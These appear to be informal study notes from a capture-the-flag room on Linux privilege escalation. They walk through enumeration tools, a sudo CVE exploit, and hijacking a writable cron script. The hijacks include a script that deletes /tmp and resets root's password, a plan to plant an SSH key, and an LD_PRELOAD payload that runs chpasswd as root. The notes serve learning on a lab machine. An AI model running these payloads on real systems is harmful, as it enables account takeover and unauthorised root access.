
# Automated enumeration tools
the listed tools are very common, there are many more tools

this is more of to show that you **do** need more than one tool to be proper

### 1) LinPEAS
    - looks for privilege escalation paths on Linux/Unix systems
### 2) LinEnum
    - scripted local enumeration
    - dumps information in a structured report
### 3) Linux Exploit Suggester
    suggests exploits based on kernel version and other system information

# Public exploits

### 1) searchsploit
    CLI tool to search for exploits in the local Exploit-DB repository
`searchsploit <software> <version>`

### 2) GitHub
    yes, it is a good place to find exploits, especially PoCs for specific CVEs
google this: `CVE-<ID> github`

### 3) kernel exploit googling
    google exploits suiting the kernel version and other info based on these commands:
`uname -r`

`uname -a`

`cat /etc/os-release`

### Example
we ran Linux Exploit Suggester on a machine where we only had a basic user (called john)

we found that it's vulnerable to a specific CVE, and the tool also gave us a link to a PoC exploit on GitHub

we download it on attacker and send it to target with:

`scp /root/Downloads/exploit.zip john@<TARGET_IP>:/home/john/`

it was CVE-2025-32463 (sudo-chwoot), we ran it and got root shell

# pspy - unpriviliged process monitoring

```
pspy = process monitoring tool

it lets unprivileged users observe running processes, cron jobs and commands executed by other users in real-time, without needing root permissions.
```

yes, there is demonic pixelart involved...
we found a root-privilege script

ls -l <SCRIPT_NAME> shows that we can write to it, so we replace it with:
```
#!/bin/bash
rm -r /tmp/*
echo "root:newpass" | chpasswd
```
now we just login as root with newpass

`su` and enter `newpass` and we are root

# Challenge

we are still john the user and have zero tools installed, play a bit of chess and have zero bit-ches

let's start from attacker
linpeas is for kids.

we will try linenum first
`git clone https://github.com/rebootuser/LinEnum.git`

give it to john with

`scp /root/Downloads/LinEnum/LinEnum.sh john@10.112.162.73:/home/john/`

now john:

run it
`./LinEnum.sh`

we can read /etc/passwd but that's kinda it
we have some SUID files and Sudo version 1.9.15p5

googling the sudo version, we found the exact CVE-2025-32463 (sudo-chwoot) that we found with Linux Exploit Suggester in the previous (unrelated) section.

`scp /root/Downloads/exploit.zip john@challenge:/home/john/`

bro doesn't have unzip. sending exploit right away! (**"schicke das exploit direkt vorbei"**)

`scp /root/Downloads/CVE-2025-3
2463-sudo-chwoot-main/sudo-chwoot.sh john@10.112.162.73:/home/john/`

don't forget `chmod +x sudo-chwoot.sh`
before `./sudo-chwoot.sh`

bruh we are not permitted to use -R with woot, so exploit fails...

`sudo -l` nope. sudo is forbidden

well, pspy?

attacker:
google https://github.com/dominicbreuker/pspy

then scp

`scp /root/Downloads/pspy64 john@10.112.162.73:/home/john/`

now john time:
`chmod +x pspy64`
`./pspy64`

UID 1002 is running  /opt/scripts/backup.sh
`id 1002` shows us that is frank, let's inspect that

$ ls -l /opt/scripts/backup.sh 
-rwxrwxrwx 1 frank frank 89 Mar 12 08:37 /opt/scripts/backup.sh

tried replacing it but doesn't really work

let's try Linux Exploit Suggester

attacker:
`wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh`

`scp /root/Downloads/les.sh john@10.112.162.73:/home/john/`

john:
`chmod +x les.sh && ./les.sh`

CVE-2021-3156: sudo Baron Samedit

that is bruteforce, so we will try to find a better one

This challenge was very ahead of the room content.

bruh this is such a bad challenge, I read some writeup and here is an overview:

0) we can append to frank's backup script, effectively executing anything as frank
1) generate a new key with `ssh-keygen`
2) take franks backup script and append code that makes a new folder, puts the key we generated in /home/frank/.ssh/authorized_keys and chmod 600 it
3) ssh -i <the_priv_key_path> frank@<TARGET_IP> and we are frank


## the rest is some weird shit, copied it straigth from the [writeup](https://www.sharonjebitok.com/linux-privilege-escalation-automation-tryhackme) made by Sharon Jebitok

basically, we abuse LD_PRELOAD and change root's password. It's pretty complicated if you don't know this kind of C programming, so I skipped it.
```
cat >> /opt/scripts/backup.sh << 'EOF'
cat > /tmp/shell.c << 'CEOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -c 'echo root:newpass | chpasswd'");
}
CEOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id
EOF
```

45-minute room, yeah sure bro